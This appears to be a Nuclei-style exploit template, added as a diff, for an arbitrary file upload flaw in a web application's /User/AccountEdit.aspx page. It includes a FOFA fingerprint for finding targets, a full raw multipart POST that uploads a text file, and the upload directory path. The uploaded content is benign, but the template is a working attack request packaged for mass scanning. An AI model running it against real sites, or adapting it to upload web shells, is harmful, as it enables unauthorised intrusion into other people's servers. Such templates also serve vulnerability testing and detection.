@@ -1,0 +1,112 @@
+id: poc-xwu1yx9q7udkuitx
+info:
+  name: 微擎系统-任意文件上传-AccountEdit
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xwu1yx9q7udkuitx'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xwu1yx9q7udkuitx
+    fofa: body="/Widgets/WidgetCollection/"
+http:
+- raw:
+  - 'POST /User/AccountEdit.aspx HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Content-Type: multipart/form-data;boundary=---------------------------786435874t38587593865736587346567358735687
+
+
+
+
+    -----------------------------786435874t38587593865736587346567358735687
+
+
+    Content-Disposition: form-data; name="__VIEWSTATE"
+
+
+
+
+    /wEPDwUJNjcyMTYyMDMwD2QWAmYPZBYCAgcPZBYCAgEQFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb3JtLWRhdGFkFgICAQ8PFgIeBFRleHQFigI8TEkgY2xhc3M9VGFiSW4gaWQ9dGFiMSBzdHlsZT0nZGlzcGxheTonPjxBPuWfuuacrOS/oeaBrzwvQT4gPC9MST48TEkgY2xhc3M9VGFiT3V0IGlkPXRhYjQgIHN0eWxlPSdkaXNwbGF5Oic+PEEgIGhyZWY9L1VzZXIvQWNjb3VudEVkaXQuYXNweD90YWI9ND7pgInpobk8L0E+IDwvTEk+PExJIGNsYXNzPVRhYk91dCBpZD10YWI1ICBzdHlsZT0nZGlzcGxheTonPjxBICBocmVmPS9Vc2VyL0FjY291bnRFZGl0LmFzcHg/dGFiPTU+5a+G56CB6K6+572uPC9BPiA8L0xJPmRkZOX0i8mrnQ9ovw3e1OKO9NtVXO50
+
+
+    -----------------------------786435874t38587593865736587346567358735687
+
+
+    Content-Disposition: form-data; name="__EVENTVALIDATION"
+
+
+
+
+    /wEWBgKYv82vCAK8ko+sCwLj7JnWDwKavpXnAwKmyMubDAKW1typA0S4QAUrxTuiaAZtLTFPDJ6Hk6Mh
+
+
+    -----------------------------786435874t38587593865736587346567358735687
+
+
+    Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$upload"; filename="dudesite.txt"
+
+
+    Content-Type: text/plain
+
+
+
+
+    Hello World!
+
+
+    -----------------------------786435874t38587593865736587346567358735687
+
+
+    Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$bttnUpload"
+
+
+
+
+    上传图片
+
+
+    -----------------------------786435874t38587593865736587346567358735687
+
+
+    Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$txtLastName"
+
+
+
+
+
+
+    -----------------------------786435874t38587593865736587346567358735687
+
+
+    Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$txtEmail"
+
+
+
+
+
+
+    -----------------------------786435874t38587593865736587346567358735687--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /_data/Uploads/'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
